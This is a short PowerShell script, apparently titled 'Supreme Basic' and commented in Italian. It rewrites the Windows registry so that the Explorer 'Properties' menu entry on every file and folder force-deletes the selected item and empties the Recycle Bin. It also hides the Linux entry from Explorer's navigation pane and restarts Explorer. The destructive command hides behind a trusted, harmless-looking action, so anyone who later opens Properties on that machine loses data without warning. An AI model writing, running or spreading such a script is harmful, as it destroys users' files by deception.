# SUPREME BASIC BY LABADIMILLE

# 1. TRITACARNE PROPRIETA'
$Tritacarne = 'cmd.exe /c echo Distruzione... && powershell -Command "$sh = New-Object -ComObject Shell.Application; $sh.NameSpace(10).MoveHere(''%1''); Clear-RecycleBin -Force -ErrorAction SilentlyContinue" && rd /s /q "%1" & del /f /q "%1"'

# Funzione universale per il registro
function Set-Key($Path, $Value) {
    if (!(Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
    Set-ItemProperty -Path $Path -Name "(Default)" -Value $Value
}

# Applicazione ai vari tipi di cartelle e file
Set-Key "Registry::HKEY_CLASSES_ROOT\Folder\shell\Properties\command" $Tritacarne
Set-Key "Registry::HKEY_CLASSES_ROOT\*\shell\Properties\command" $Tritacarne
Set-Key "Registry::HKEY_CLASSES_ROOT\Directory\shell\Properties\command" $Tritacarne

# 2. NASCONDI LINUX DA RETE
$LinuxCLSID = "HKCU:\Software\Classes\CLSID\{2cc5ca98-6485-489a-920e-b3e88a6ccce3}"
if (!(Test-Path $LinuxCLSID)) { New-Item $LinuxCLSID -Force | Out-Null }
Set-ItemProperty -Path $LinuxCLSID -Name "System.IsPinnedToNameSpaceTree" -Value 0

# 3. REFRESH SISTEMA
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Start-Process explorer

Write-Host "SUPREME BASIC PRONTO."
